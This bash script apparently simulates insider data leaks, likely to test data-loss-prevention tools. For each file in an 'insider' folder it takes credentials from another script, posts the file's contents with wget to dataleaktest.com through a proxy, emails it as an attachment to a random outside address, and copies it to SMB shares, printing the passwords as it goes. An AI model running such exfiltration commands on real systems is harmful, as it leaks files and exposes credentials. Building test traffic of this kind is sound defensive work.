one=$1
function sleep_me {
if [ "$one" != "fast" ]
then
sleeper=`seq 45 | sort -rn | head -n 35 | shuf -n 1`
else
sleeper=5
fi
echo Sleeping $sleeper
echo
}
for files in `ls emailfiles/insider/`
	do 
                echo "*************** BEGIN RUN WITH $files ***************"
                echo
# Post data to the web for a user from users.txt
		user=`grep 'tinygen/en' /usr/local/tinygen/runit_ep.sh | awk '{print $3}'`
		pass=`grep 'tinygen/en' /usr/local/tinygen/runit_ep.sh | awk '{print $4}'`
		proxy=`tail -n 1 /usr/local/tinygen/proxies.txt`
		Post_Data=`cat /usr/local/tinygen/emailfiles/insider/$files`
		export http_proxy=http://$domain_name\\$user:$pass@$proxy
		export https_proxy=https://$domain_name\\$user:$pass@$proxy
		echo posting contents of $files to dataleaktest.com using user $user and password $pass
		#echo $https_proxy
		wget -q -O/dev/null --no-check-certificate --post-data="$Post_Data" https://dataleaktest.com/display-datap.asp>/dev/null
		sleep_me
		sleep $sleeper

#email files
#Send email from the same user with the file as an attachment
mta=`grep tinygen runit.CentOS.sh | awk '{print $7}'`
to_user=`shuf -n 1 /usr/local/tinygen/emailfiles/header/recipients.txt`
to_domain=`shuf -n 1 /usr/local/tinygen/emailfiles/header/domains.txt`
subject=`shuf -n 1 /usr/local/tinygen/emailfiles/header/subject.txt`
domain=`grep tinygen runit.CentOS.sh | awk '{print $3}'`
domain_name=`echo $domain | awk -F"." '{print$1}'`
domain_extension=`echo $domain | awk -F"." '{print$2}'`
echo
echo emailing $files to $to_user@$to_domain from $user@$domain
mailx -S smtp=$mta -a "/usr/local/tinygen/emailfiles/insider/$files" -r $user@$domain -s "$subject $files" -v $to_user@$to_domain< /usr/local/tinygen/emailfiles/spam/$email_body > /tmp/mailedit_inbound.txt 2>&1
sleep_me
sleep $sleeper


#Copy to USB from that user
		share=`shuf -n 1 /usr/local/tinygen/shares.txt` 
		IP=`echo $share | awk -F "," '{print $1}'`
		#folder=`echo $share | awk -F "," '{print $2}'`
		domain=`grep "tinygen/en" /usr/local/tinygen/runit_ep.sh | awk '{print $2}'`
		user=`grep "tinygen/en" /usr/local/tinygen/runit_ep.sh | awk '{print $3}'`
		passwd=`grep "tinygen/en" /usr/local/tinygen/runit_ep.sh | awk '{print $4}'`
		for shares in `cat /usr/local/tinygen/shares.txt | awk -F "," '{print $2}'`
		do
		echo putting $files to IP $IP and share $shares using user $domain\\$user and passwd $passwd
		cd /usr/local/tinygen/emailfiles/insider
                smbclient //$IP/$shares -U $domain/$user%$passwd -c "put "$files"" #2>/dev/null
                sleep 15
		if [ "$shares" != "dropit" ]
		then
		smbclient //$IP/$shares -U $domain/$user%$passwd -c "rm "$files"" #2>/dev/null
		fi
                sleep_me
                sleep $sleeper
		cd
		done
		date 
		echo "*************** END RUN WITH $files ***************"
		echo
	done
